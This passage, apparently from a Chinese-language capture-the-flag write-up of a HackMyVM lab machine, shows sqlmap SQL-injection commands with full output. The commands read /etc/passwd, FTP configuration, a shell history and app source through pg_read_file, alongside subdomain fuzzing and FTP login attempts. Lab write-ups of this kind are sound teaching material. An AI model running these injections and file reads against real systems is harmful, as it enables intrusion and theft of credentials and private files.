<span class="pl-s">[03:44:40] [INFO] fetched data logged to text files under <span class="pl-pds">'</span></span>/home/kali/.local/share/sqlmap/output/192.168.205.205<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s"></span>
<span class="pl-s">[*] ending @ 03:44:40 /2025-07-22/</span></pre></div>
<p>有域名，加域名爆破</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo vim /etc/hosts                          
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n 1 /etc/hosts                                                                                                                          
192.168.205.205 multi.hmv 
                
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wfuzz -c -u <span class="pl-s"><span class="pl-pds">"</span>http://multi.hmv/<span class="pl-pds">"</span></span> -H <span class="pl-s"><span class="pl-pds">"</span>HOST:FUZZ.multi.hmv<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 933
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="pl-s"><span class="pl-pds">'</span>s documentation for more information.</span>
<span class="pl-s">********************************************************</span>
<span class="pl-s">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span>
<span class="pl-s">********************************************************</span>
<span class="pl-s"></span>
<span class="pl-s">Target: http://multi.hmv/</span>
<span class="pl-s">Total requests: 114442</span>
<span class="pl-s"></span>
<span class="pl-s">=====================================================================</span>
<span class="pl-s">ID           Response   Lines    Word       Chars       Payload                                                                                                          </span>
<span class="pl-s">=====================================================================</span>
<span class="pl-s"></span>
<span class="pl-s">000009532:   400        10 L     35 W       301 Ch      "#www - #www"                                                                                                    </span>
<span class="pl-s">000010581:   400        10 L     35 W       301 Ch      "#mail - #mail"                                                                                                  </span>
<span class="pl-s">000047706:   400        10 L     35 W       301 Ch      "#smtp - #smtp"                                                                                                  </span>
<span class="pl-s">000103135:   400        10 L     35 W       301 Ch      "#pop3 - #pop3"                                                                                                  </span>
<span class="pl-s"></span>
<span class="pl-s">Total time: 68.80952</span>
<span class="pl-s">Processed Requests: 114442</span></pre></div>
<p>然后重新爆破目录，没有收获</p>
<p>着重扒拉了一下sql，复现可以读文件</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query <span class="pl-s"><span class="pl-pds">"</span>SELECT pg_read_file('/etc/passwd', 0, 1000000)<span class="pl-pds">"</span></span>
        ___
       __H__
 ___ ___[<span class="pl-s"><span class="pl-pds">"</span>]_____ ___ ___  {1.9.6#stable}</span>
<span class="pl-s">|_ -| . [,]     | .'| . |</span>
<span class="pl-s">|___|_  [,]_|_|_|__,|  _|</span>
<span class="pl-s">      |_|V...       |_|   https://sqlmap.org</span>
<span class="pl-s"></span>
<span class="pl-s">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
<span class="pl-s"></span>
<span class="pl-s">[*] starting @ 23:42:07 /2025-07-21/</span>
<span class="pl-s"></span>
<span class="pl-s">[23:42:07] [INFO] parsing HTTP request from 'tmp/1'</span>
<span class="pl-s">[23:42:07] [INFO] resuming back-end DBMS 'postgresql' </span>
<span class="pl-s">[23:42:07] [INFO] testing connection to the target URL</span>
<span class="pl-s">sqlmap resumed the following injection point(s) from stored session:</span>
<span class="pl-s">---</span>
<span class="pl-s">Parameter: keyword (POST)</span>
<span class="pl-s">    Type: UNION query</span>
<span class="pl-s">    Title: Generic UNION query (NULL) - 3 columns</span>
<span class="pl-s">    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka</span>
<span class="pl-s">---</span>
<span class="pl-s">[23:42:07] [INFO] the back-end DBMS is PostgreSQL</span>
<span class="pl-s">back-end DBMS: PostgreSQL</span>
<span class="pl-s">[23:42:07] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/passwd', 0, 1000000)'</span>
<span class="pl-s">[23:42:07] [WARNING] reflective value(s) found and filtering out</span>
<span class="pl-s">SELECT pg_read_file('/etc/passwd', 0, 1000000): 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nxiao:x:1001:1001::/home/xiao:/bin/bash\ntelnetd:x:106:113::/nonexistent:/usr/sbin/nologin\nredis:x:107:114::/var/lib/redis:/usr/sbin/nologin\nftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\nsecure_user:x:1002:1002::/home/secure_user:/bin/bash\nmysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false\nsamba_user:x:1003:1003::/home/samba_user:/bin/false\n_rpc:x:110:65534::/run/rpcbind:/usr/sbin/nologin\nstatd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin\npostgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\ntodd:x:1000:1000:,,,:/home/todd:/bin/bash\n'</span>
<span class="pl-s">[23:42:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'</span>
<span class="pl-s"></span>
<span class="pl-s">[*] ending @ 23:42:07 /2025-07-21/</span></pre></div>
<ul>
<li><code class="notranslate">xiao:x:1001:1001::/home/xiao:/bin/bash</code></li>
<li><code class="notranslate">secure_user:x:1002:1002::/home/secure_user:/bin/bash</code></li>
<li><code class="notranslate">todd:x:1000:1000:,,,:/home/todd:/bin/bash</code></li>
</ul>
<p>尝试读取密钥，全都没有权限</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query <span class="pl-s"><span class="pl-pds">"</span>SELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000)<span class="pl-pds">"</span></span>
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
<span class="pl-k">|</span>_ -<span class="pl-k">|</span> <span class="pl-c1">.</span> [(]     <span class="pl-k">|</span> .<span class="pl-s"><span class="pl-pds">'</span>| . |</span>
<span class="pl-s">|___|_  [<span class="pl-pds">'</span></span>]_<span class="pl-k">|</span>_<span class="pl-k">|</span>_<span class="pl-k">|</span>__,<span class="pl-k">|</span>  _<span class="pl-k">|</span>
      <span class="pl-k">|</span>_<span class="pl-k">|</span>V...       <span class="pl-k">|</span>_<span class="pl-k">|</span>   https://sqlmap.org

[<span class="pl-k">!</span>] legal disclaimer: Usage of sqlmap <span class="pl-k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="pl-s"><span class="pl-pds">'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
<span class="pl-s"></span>
<span class="pl-s">[*] starting @ 23:50:12 /2025-07-21/</span>
<span class="pl-s"></span>
<span class="pl-s">[23:50:12] [INFO] parsing HTTP request from <span class="pl-pds">'</span></span>tmp/1<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">[23:50:12] [INFO] resuming back-end DBMS <span class="pl-pds">'</span></span>postgresql<span class="pl-s"><span class="pl-pds">'</span> </span>
<span class="pl-s">[23:50:12] [INFO] testing connection to the target URL</span>
<span class="pl-s">sqlmap resumed the following injection point(s) from stored session:</span>
<span class="pl-s">---</span>
<span class="pl-s">Parameter: keyword (POST)</span>
<span class="pl-s">    Type: UNION query</span>
<span class="pl-s">    Title: Generic UNION query (NULL) - 3 columns</span>
<span class="pl-s">    Payload: keyword=1<span class="pl-pds">'</span></span> UNION ALL SELECT NULL,(CHR(113)<span class="pl-k">||</span>CHR(120)<span class="pl-k">||</span>CHR(107)<span class="pl-k">||</span>CHR(106)<span class="pl-k">||</span>CHR(113))<span class="pl-k">||</span>(CHR(112)<span class="pl-k">||</span>CHR(80)<span class="pl-k">||</span>CHR(88)<span class="pl-k">||</span>CHR(70)<span class="pl-k">||</span>CHR(67)<span class="pl-k">||</span>CHR(88)<span class="pl-k">||</span>CHR(101)<span class="pl-k">||</span>CHR(120)<span class="pl-k">||</span>CHR(77)<span class="pl-k">||</span>CHR(112)<span class="pl-k">||</span>CHR(109)<span class="pl-k">||</span>CHR(71)<span class="pl-k">||</span>CHR(76)<span class="pl-k">||</span>CHR(87)<span class="pl-k">||</span>CHR(106)<span class="pl-k">||</span>CHR(104)<span class="pl-k">||</span>CHR(107)<span class="pl-k">||</span>CHR(114)<span class="pl-k">||</span>CHR(107)<span class="pl-k">||</span>CHR(85)<span class="pl-k">||</span>CHR(83)<span class="pl-k">||</span>CHR(101)<span class="pl-k">||</span>CHR(82)<span class="pl-k">||</span>CHR(66)<span class="pl-k">||</span>CHR(100)<span class="pl-k">||</span>CHR(99)<span class="pl-k">||</span>CHR(83)<span class="pl-k">||</span>CHR(85)<span class="pl-k">||</span>CHR(80)<span class="pl-k">||</span>CHR(115)<span class="pl-k">||</span>CHR(107)<span class="pl-k">||</span>CHR(100)<span class="pl-k">||</span>CHR(116)<span class="pl-k">||</span>CHR(102)<span class="pl-k">||</span>CHR(101)<span class="pl-k">||</span>CHR(114)<span class="pl-k">||</span>CHR(74)<span class="pl-k">||</span>CHR(110)<span class="pl-k">||</span>CHR(101)<span class="pl-k">||</span>CHR(102))<span class="pl-k">||</span>(CHR(113)<span class="pl-k">||</span>CHR(112)<span class="pl-k">||</span>CHR(113)<span class="pl-k">||</span>CHR(112)<span class="pl-k">||</span>CHR(113)),NULL-- gGka
---
[23:50:12] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[23:50:12] [INFO] fetching SQL SELECT statement query output: <span class="pl-s"><span class="pl-pds">'</span>SELECT pg_read_file(<span class="pl-pds">'</span></span>/etc/vsftpd.conf<span class="pl-s"><span class="pl-pds">'</span>, 0, 1000000)<span class="pl-pds">'</span></span>
[23:50:12] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file(<span class="pl-s"><span class="pl-pds">'</span>/etc/vsftpd.conf<span class="pl-pds">'</span></span>, 0, 1000000): <span class="pl-s"><span class="pl-pds">'</span>listen=NO\nlisten_ipv6=YES\nanonymous_enable=NO\nlocal_enable=YES\nwrite_enable=YES\nlocal_umask=022\ndirmessage_enable=YES\nuse_localtime=YES\nxferlog_enable=YES\nconnect_from_port_20=YES\nchroot_local_user=YES\nallow_writeable_chroot=YES\nsecure_chroot_dir=/var/run/vsftpd/empty\npam_service_name=vsftpd\nrsa_cert_file=/etc/ssl/certs/vsftpd.crt\nrsa_private_key_file=/etc/ssl/private/vsftpd.key\nssl_enable=YES\nallow_anon_ssl=NO\nforce_local_data_ssl=YES\nforce_local_logins_ssl=YES\nssl_tlsv1=YES\nssl_sslv2=NO\nssl_sslv3=NO\nrequire_ssl_reuse=NO\nssl_ciphers=HIGH\npasv_min_port=50000\npasv_max_port=50050\nuserlist_enable=YES\nuserlist_file=/etc/vsftpd.userlist\nuserlist_deny=NO\n<span class="pl-pds">'</span></span>
[23:50:12] [INFO] fetched data logged to text files under <span class="pl-s"><span class="pl-pds">'</span>/home/kali/.local/share/sqlmap/output/192.168.205.203<span class="pl-pds">'</span></span>

[<span class="pl-k">*</span>] ending @ 23:50:12 /2025-07-21/
</pre></div>
<p>vsftpd其中重点的东西</p>
<blockquote>
<p>listen=NO<br>
listen_ipv6=YES<br>
anonymous_enable=NO     # 不允许匿名登录，这和我们之前的测试结果一致<br>
local_enable=YES        # 允许本地用户登录，这是关键<br>
write_enable=YES        # 允许写入！这是另一个关键<br>
...<br>
chroot_local_user=YES   # 将用户限制在自己的家目录中<br>
allow_writeable_chroot=YES # 允许家目录可写（这是一个不安全的配置，通常需要避免）<br>
...<br>
pam_service_name=vsftpd<br>
...<br>
userlist_enable=YES      # &lt;-- ！！！ 开启了用户列表功能<br>
userlist_file=/etc/vsftpd.userlist # &lt;-- ！！！ 指定了用户列表文件<br>
userlist_deny=NO         # &lt;-- ！！！ 这是决定性的一击！</p>
</blockquote>
<p>扒拉他用户列表文件</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query <span class="pl-s"><span class="pl-pds">"</span>SELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000)<span class="pl-pds">"</span></span>
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
<span class="pl-k">|</span>_ -<span class="pl-k">|</span> <span class="pl-c1">.</span> [.]     <span class="pl-k">|</span> .<span class="pl-s"><span class="pl-pds">'</span>| . |</span>
<span class="pl-s">|___|_  [.]_|_|_|__,|  _|</span>
<span class="pl-s">      |_|V...       |_|   https://sqlmap.org</span>
<span class="pl-s"></span>
<span class="pl-s">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user<span class="pl-pds">'</span></span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="pl-k">for</span> any misuse or damage caused by this program

[<span class="pl-k">*</span>] starting @ 23:51:25 /2025-07-21/

[23:51:25] [INFO] parsing HTTP request from <span class="pl-s"><span class="pl-pds">'</span>tmp/1<span class="pl-pds">'</span></span>
[23:51:25] [INFO] resuming back-end DBMS <span class="pl-s"><span class="pl-pds">'</span>postgresql<span class="pl-pds">'</span></span> 
[23:51:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1<span class="pl-s"><span class="pl-pds">'</span> UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka</span>
<span class="pl-s">---</span>
<span class="pl-s">[23:51:25] [INFO] the back-end DBMS is PostgreSQL</span>
<span class="pl-s">back-end DBMS: PostgreSQL</span>
<span class="pl-s">[23:51:25] [INFO] fetching SQL SELECT statement query output: <span class="pl-pds">'</span></span>SELECT pg_read_file(<span class="pl-s"><span class="pl-pds">'</span>/etc/vsftpd.userlist<span class="pl-pds">'</span></span>, 0, 1000000)<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">[23:51:25] [WARNING] reflective value(s) found and filtering out</span>
<span class="pl-s">SELECT pg_read_file(<span class="pl-pds">'</span></span>/etc/vsftpd.userlist<span class="pl-s"><span class="pl-pds">'</span>, 0, 1000000): <span class="pl-pds">'</span></span>secure_user<span class="pl-cce">\n</span><span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">[23:51:25] [INFO] fetched data logged to text files under <span class="pl-pds">'</span></span>/home/kali/.local/share/sqlmap/output/192.168.205.203<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s"></span>
<span class="pl-s">[*] ending @ 23:51:25 /2025-07-21/</span></pre></div>
<p>只有 <strong>secure_user</strong> 这一个用户被授权可以通过 FTP 服务进行登录尝试</p>
<p>我们进行登录</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ftp 192.168.205.205
Connected to 192.168.205.205.
220 (vsFTPd 3.0.3)
Name (192.168.205.205:kali): secure_user
530 Non-anonymous sessions must use encryption.
ftp: Login failed
ftp<span class="pl-k">&gt;</span> <span class="pl-c1">exit</span></pre></div>
<p>叫我们加密会话，所以换lftp</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ lftp -u secure_user 192.168.205.205
密码: secure_user
lftp secure_user@192.168.205.205:<span class="pl-k">~</span><span class="pl-k">&gt;</span> ls                
ls: 严重错误: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (71:24:67:D0:3C:52:A2:8F:AF:8F:11:F9:D1:D7:19:08:A1:20:35:49)</pre></div>
<p>禁用证书</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">lftp secure_user@192.168.205.205:<span class="pl-k">~</span><span class="pl-k">&gt;</span> <span class="pl-c1">set</span> ssl:verify-certificate no
lftp secure_user@192.168.205.205:<span class="pl-k">~</span><span class="pl-k">&gt;</span> ls
ls: 登录失败: 530 Login incorrect.       </pre></div>
<p>密码是错的，后面尝试了爆破，没有收获，就回去看sql了</p>
<p>查看SQL权限</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query <span class="pl-s"><span class="pl-pds">"</span>SELECT current_user<span class="pl-pds">"</span></span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
<span class="pl-k">|</span>_ -<span class="pl-k">|</span> <span class="pl-c1">.</span> [.]     <span class="pl-k">|</span> .<span class="pl-s"><span class="pl-pds">'</span>| . |</span>
<span class="pl-s">|___|_  [.]_|_|_|__,|  _|</span>
<span class="pl-s">      |_|V...       |_|   https://sqlmap.org</span>
<span class="pl-s"></span>
<span class="pl-s">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user<span class="pl-pds">'</span></span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="pl-k">for</span> any misuse or damage caused by this program

[<span class="pl-k">*</span>] starting @ 00:11:48 /2025-07-22/

[00:11:48] [INFO] parsing HTTP request from <span class="pl-s"><span class="pl-pds">'</span>tmp/1<span class="pl-pds">'</span></span>
[00:11:48] [INFO] resuming back-end DBMS <span class="pl-s"><span class="pl-pds">'</span>postgresql<span class="pl-pds">'</span></span> 
[00:11:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1<span class="pl-s"><span class="pl-pds">'</span> UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka</span>
<span class="pl-s">---</span>
<span class="pl-s">[00:11:48] [INFO] the back-end DBMS is PostgreSQL</span>
<span class="pl-s">back-end DBMS: PostgreSQL</span>
<span class="pl-s">[00:11:48] [INFO] fetching SQL SELECT statement query output: <span class="pl-pds">'</span></span>SELECT current_user<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">[00:11:48] [WARNING] reflective value(s) found and filtering out</span>
<span class="pl-s">SELECT current_user: <span class="pl-pds">'</span></span>dvuser<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">[00:11:48] [INFO] fetched data logged to text files under <span class="pl-pds">'</span></span>/home/kali/.local/share/sqlmap/output/192.168.205.203<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s"></span>
<span class="pl-s">[*] ending @ 00:11:48 /2025-07-22/</span></pre></div>
<p>读取一下他的命令历史记录</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query <span class="pl-s"><span class="pl-pds">"</span>SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000)<span class="pl-pds">"</span></span>
        ___
       __H__
 ___ ___[<span class="pl-s"><span class="pl-pds">'</span>]_____ ___ ___  {1.9.6#stable}</span>
<span class="pl-s">|_ -| . [)]     | .<span class="pl-pds">'</span></span><span class="pl-k">|</span> <span class="pl-c1">.</span> <span class="pl-k">|</span>
<span class="pl-k">|</span>___<span class="pl-k">|</span>_  [<span class="pl-s"><span class="pl-pds">"</span>]_|_|_|__,|  _|</span>
<span class="pl-s">      |_|V...       |_|   https://sqlmap.org</span>
<span class="pl-s"></span>
<span class="pl-s">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
<span class="pl-s"></span>
<span class="pl-s">[*] starting @ 00:13:37 /2025-07-22/</span>
<span class="pl-s"></span>
<span class="pl-s">[00:13:37] [INFO] parsing HTTP request from 'tmp/1'</span>
<span class="pl-s">[00:13:37] [INFO] resuming back-end DBMS 'postgresql' </span>
<span class="pl-s">[00:13:37] [INFO] testing connection to the target URL</span>
<span class="pl-s">sqlmap resumed the following injection point(s) from stored session:</span>
<span class="pl-s">---</span>
<span class="pl-s">Parameter: keyword (POST)</span>
<span class="pl-s">    Type: UNION query</span>
<span class="pl-s">    Title: Generic UNION query (NULL) - 3 columns</span>
<span class="pl-s">    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka</span>
<span class="pl-s">---</span>
<span class="pl-s">[00:13:37] [INFO] the back-end DBMS is PostgreSQL</span>
<span class="pl-s">back-end DBMS: PostgreSQL</span>
<span class="pl-s">[00:13:37] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000)'</span>
<span class="pl-s">[00:13:37] [WARNING] reflective value(s) found and filtering out</span>
<span class="pl-s">SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000): 'geAbgWpouT=xBcZHwGxAX KOxuJqpGxZ=KEqNdLkFrf;printf <span class="pl-smi">$geAbgWpouT$KOxuJqpGxZ</span>;echo <span class="pl-smi">$$</span>;printf <span class="pl-smi">$KOxuJqpGxZ$geAbgWpouT</span>\n hSAkQvpQLQ=lTHFyQbFqh nSpdwixuov=CqlpNdGWDg;printf <span class="pl-smi">$hSAkQvpQLQ$nSpdwixuov</span>;echo <span class="pl-pds">"</span></span><span class="pl-s"><span class="pl-pds">$(</span>id -un<span class="pl-pds">)</span></span>(<span class="pl-s"><span class="pl-pds">$(</span>id -u<span class="pl-pds">)</span></span>)<span class="pl-s"><span class="pl-pds">"</span>;printf <span class="pl-smi">$nSpdwixuov$hSAkQvpQLQ</span>\n SNBrffgiiZ=ELTGdWlbkd ranIeerCgZ=dhqaYbOtwr;printf <span class="pl-smi">$SNBrffgiiZ$ranIeerCgZ</span>;tty;printf <span class="pl-smi">$ranIeerCgZ$SNBrffgiiZ</span>\ncd /home\nfind \ncd /usr/local/bin\nls -la\ncat custom_login \ncat /etc/default/telnet\necho 'ENABLE_BACKDOOR' &gt; /etc/default/telnet\ncd /var/www/html/\nls -la\ncd pub/\nls -la\ntouch a\ncd /home\ncd /opt\nls\ncat app.py \ncd /srv\nls -la\nfind\nls -la\ncd secure_share/\n'</span>
<span class="pl-s">[00:13:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'</span>
<span class="pl-s"></span>
<span class="pl-s">[*] ending @ 00:13:37 /2025-07-22/</span></pre></div>
<blockquote>
<p>... (一些混淆视听的命令) ...</p>
<p>cd /opt          # &lt;-- 他进入了 /opt 目录<br>
ls<br>
cat app.py       # &lt;-- ！！！他查看了一个叫做 app.py 的文件！<br>
cd /srv<br>
ls -la<br>
find<br>
ls -la<br>
cd secure_share/ # &lt;-- 这个共享目录我们之前见过</p>
</blockquote>
<p>去看看app.py的源码</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query <span class="pl-s"><span class="pl-pds">"</span>SELECT pg_read_file('/opt/app.py', 0, 1000000)<span class="pl-pds">"</span></span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
<span class="pl-k">|</span>_ -<span class="pl-k">|</span> <span class="pl-c1">.</span> [(]     <span class="pl-k">|</span> .<span class="pl-s"><span class="pl-pds">'</span>| . |</span>
<span class="pl-s">|___|_  ["]_|_|_|__,|  _|</span>
<span class="pl-s">      |_|V...       |_|   https://sqlmap.org</span>
<span class="pl-s"></span>
<span class="pl-s">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user<span class="pl-pds">'</span></span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="pl-k">for</span> any misuse or damage caused by this program

[<span class="pl-k">*</span>] starting @ 00:14:51 /2025-07-22/

[00:14:51] [INFO] parsing HTTP request from <span class="pl-s"><span class="pl-pds">'</span>tmp/1<span class="pl-pds">'</span></span>
[00:14:51] [INFO] resuming back-end DBMS <span class="pl-s"><span class="pl-pds">'</span>postgresql<span class="pl-pds">'</span></span> 
[00:14:51] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
